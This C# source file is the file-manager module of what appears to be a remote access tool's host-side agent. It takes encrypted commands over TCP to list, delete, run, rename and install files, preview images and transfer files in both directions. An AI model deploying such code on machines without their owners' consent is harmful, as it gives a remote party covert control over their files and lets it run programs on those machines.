using System;
using System.Net.Sockets;
using System.Threading;
using bc.srv.Classes.Comunicator;

namespace bc.srv.Modules.File_Manager
{
    internal class FileManager
    {
        private static bool _closeFileManager;
        private static bool _closeImagePreview;
        private static bool _closeGalleryChannel;

        private static bool _isImageWorking;

        private static bool _isGalleryWorking;

        //NetworkStream myNetStream = null;
        private readonly TcpClient myTcpClient;


        public FileManager(TcpClient ctorTcp)
        {
            this.myTcpClient = ctorTcp;
        }


        /// <summary>
        ///     Avvia un nuovo thread FileManager
        /// </summary>
        public void StartFmThread()
        {
            var t = new Thread(this.StartFileManager);
            t.IsBackground = true;
            t.Start();
        }
        //--------------------------------------

        /// <summary>
        ///     Esce dal Loop di ascolto
        /// </summary>
        public void StopFileManager()
        {
            _closeFileManager = true;
        }


        /// <summary>
        ///     Esce dal Loop di ascolto
        /// </summary>
        public void StopImagePreview()
        {
            if (_isImageWorking)
                _closeImagePreview = true;
        }

        /// <summary>
        ///     Esce dal Loop di Gallery
        /// </summary>
        public void StopGallery()
        {
            if (_isGalleryWorking)
                _closeGalleryChannel = true;
        }

        /// <summary>
        ///     Thread Principale del FileManager.. Comunica tramite mainStream FileManager
        ///     Risponde a Listare file, eseguire file e aprire thread per trasmissione file!
        /// </summary>
        private void StartFileManager()
        {
            try
            {
                var mm = new MsgManager(this.myTcpClient.GetStream());

                while (!_closeFileManager || !SrvData.Instance.isConnected)
                {
                    var fmRequest = mm.WaitForEncryMessageRicorsive(10000);

                    if (fmRequest != "TIMEOUT" && fmRequest != "_ERROR_")
                        this.Interpreter(fmRequest);
                }

                //  USCITO DA LOOP IL THREAD MUORE
                this.myTcpClient.GetStream().Close();
                this.myTcpClient.Close();
                _closeFileManager = false; // E' STATICO CAZZONE!!!!!!

                // RIMUOVO DA LISTA
                if (SrvData.Instance.nsListaCanali.Contains(this.myTcpClient.GetStream()))
                    SrvData.Instance.nsListaCanali.Remove(this.myTcpClient.GetStream());
            }
            catch (ObjectDisposedException)
            {
                //MessageBox.Show("Oggetto Filemanager NS è Dispose!");
            }
        }
        //--------------------------------------


        /// <summary>
        ///     Interprete Del Messaggio Di richiesta
        /// </summary>
        /// <param name="msg"></param>
        private void Interpreter(string msg)
        {
            var msgSplitted = msg.Split('|');
            switch (msgSplitted[0])
            {
                // LISTA I DRIVES
                case "LIST_DRIVE":
                    var lf = new ListFiles(this.myTcpClient.GetStream());
                    lf.StartListDevices();
                    break;

                // LISTA CARTELLE SPECIALI
                case "LIST_SPECIAL":
                    var lfd = new ListFiles(this.myTcpClient.GetStream());
                    lfd.StartListSpecial();
                    break;

                // LISTA FILE IN DIR
                case "LIST_CONTENT":
                    var dir = msgSplitted[1];
                    var lfdir = new ListFiles(this.myTcpClient.GetStream(), dir);
                    lfdir.StartListFile();
                    break;

                // LISTA FILE IN DIR
                case "FILE_DELETE":
                    var fma = new FileManAction(msgSplitted[1], this.myTcpClient.GetStream());
                    fma.StartDelFile();
                    break;

                // LISTA RUN FILES
                case "FILE_RUN":
                    var fmarun = new FileManAction(msgSplitted[2], this.myTcpClient.GetStream());
                    fmarun.StartRunFiles(msgSplitted[1]);
                    break;

                // RENAME FILE
                case "FILE_RENAME":
                    var fmren = new FileManAction(this.myTcpClient.GetStream());
                    fmren.StartRename(msgSplitted[1], msgSplitted[2]);
                    break;

                // CREATE NEW FOLDER
                case "FILE_NEW_FOLDER":
                    var fmaNf = new FileManAction(this.myTcpClient.GetStream());
                    fmaNf.StartNewFolderCration(msgSplitted[1]);
                    break;


                // INSTALL FILE
                case "FILE_INSTALL":
                    var fmaIf = new FileManAction(this.myTcpClient.GetStream());
                    fmaIf.StartInstallFile(msgSplitted[1], msgSplitted[2]);
                    break;


                // RICHIESTA DI CHIUSURA STREAM
                case "CLOSE_CONNECTION":
                    this.StopFileManager();
                    this.StopImagePreview();
                    this.StopGallery();

                    break;
            }
        }
        //----------------------------------------


        /// <summary>
        ///     Avvia un nuovo thread Image PReview
        /// </summary>
        public void StartImThread()
        {
            var t = new Thread(this.StartImagePreviewManager);
            t.IsBackground = true;
            t.Start();
        }
        //--------------------------------------

        /// <summary>
        ///     Thread cominicazione invio image preview
        /// </summary>
        private void StartImagePreviewManager()
        {
            try
            {
                var mm = new MsgManager(this.myTcpClient.GetStream());
                _isImageWorking = true;

                while (!_closeImagePreview || !SrvData.Instance.isConnected)
                {
                    var fmRequest = mm.WaitForEncryMessageRicorsive(10000);

                    if (fmRequest != "TIMEOUT" && fmRequest != "_ERROR_")
                    {
                        var msgSplitted = fmRequest.Split('|');

                        if (msgSplitted[0] == "IMAGE_PREVIEW")
                        {
                            var fmaIm = new FileManAction(this.myTcpClient.GetStream());
                            fmaIm.StartImagePreview(msgSplitted[1]);
                        }
                    }
                }

                //  USCITO DA LOOP IL THREAD MUORE
                this.myTcpClient.GetStream().Close();
                this.myTcpClient.Close();
                _closeImagePreview = false; // E' STATICO CAZZONE!!!!!!
                _isImageWorking = false;

                // RIMUOVO DA LISTA
                if (SrvData.Instance.nsListaCanali.Contains(this.myTcpClient.GetStream()))
                    SrvData.Instance.nsListaCanali.Remove(this.myTcpClient.GetStream());
            }
            catch (ObjectDisposedException)
            {
                //MessageBox.Show("Oggetto Filemanager NS è Dispose!");
                _isImageWorking = false;
            }
        }
        //--------------------------------------


        /// <summary>
        ///     Avvia un nuovo thread Image PReview
        /// </summary>
        public void StartGalleryThread()
        {
            var t = new Thread(this.StartGalleryManager);
            t.IsBackground = true;
            t.Start();
        }
        //--------------------------------------

        /// <summary>
        ///     Thread cominicazione invio image preview
        /// </summary>
        private void StartGalleryManager()
        {
            try
            {
                var mm = new MsgManager(this.myTcpClient.GetStream());
                _isGalleryWorking = true;

                while (!_closeGalleryChannel || !SrvData.Instance.isConnected)
                {
                    var fmRequest = mm.WaitForEncryMessageRicorsive(10000);

                    if (fmRequest != "TIMEOUT" && fmRequest != "_ERROR_")
                    {
                        var msgSplitted = fmRequest.Split('|');

                        if (msgSplitted[0] == "IMAGE_GALLERY")
                        {
                            var fmaIm = new FileManAction(this.myTcpClient.GetStream());
                            fmaIm.StartImageGallery(msgSplitted[1]);
                        }
                    }
                }

                //  USCITO DA LOOP IL THREAD MUORE
                this.myTcpClient.GetStream().Close();
                this.myTcpClient.Close();
                _closeGalleryChannel = false; // E' STATICO CAZZONE!!!!!!
                _isGalleryWorking = false;

                // RIMUOVO DA LISTA
                if (SrvData.Instance.nsListaCanali.Contains(this.myTcpClient.GetStream()))
                    SrvData.Instance.nsListaCanali.Remove(this.myTcpClient.GetStream());
            }
            catch (ObjectDisposedException)
            {
                //MessageBox.Show("Oggetto Filemanager NS è Dispose!");
                _isGalleryWorking = false;
            }
        }
        //--------------------------------------


        /// <summary>
        ///     Avvia un nuovo thread Per invio File
        /// </summary>
        public void StartTransfThread()
        {
            var t = new Thread(this.TransfThread);
            t.IsBackground = true;
            t.Start();
        }
        //--------------------------------------

        /// <summary>
        /// </summary>
        private void TransfThread()
        {
            try
            {
                var mm = new MsgManager(this.myTcpClient.GetStream());

                var fmRequest = mm.WaitForEncryMessageRicorsive(15000); // ASPETTO LA RICHIESTA DEL FILE PER 15 SEC

                if (fmRequest != "TIMEOUT" && fmRequest != "_ERROR_")
                {
                    var msgSplitted = fmRequest.Split('|');

                    if (msgSplitted[0] == "TRANSFER")
                    {
                        var fmaIm = new FileManAction(this.myTcpClient.GetStream());
                        fmaIm.SendFileTrans(msgSplitted[1]);
                    }

                    if (msgSplitted[0] == "UPLOAD")
                    {
                        var fmaIm = new FileManAction(this.myTcpClient.GetStream());
                        fmaIm.ReceiveFile(msgSplitted[1]);
                    }
                }

                //  USCITO DA LOOP IL THREAD MUORE
                this.myTcpClient.GetStream().Close();
                this.myTcpClient.Close();

                // RIMUOVO DA LISTA
                if (SrvData.Instance.nsListaCanali.Contains(this.myTcpClient.GetStream()))
                    SrvData.Instance.nsListaCanali.Remove(this.myTcpClient.GetStream());
            }
            catch (ObjectDisposedException)
            {
                //MessageBox.Show("Oggetto Filemanager NS è Dispose!");
                _isImageWorking = false;
            }
        }
        //--------------------------------------
    }
}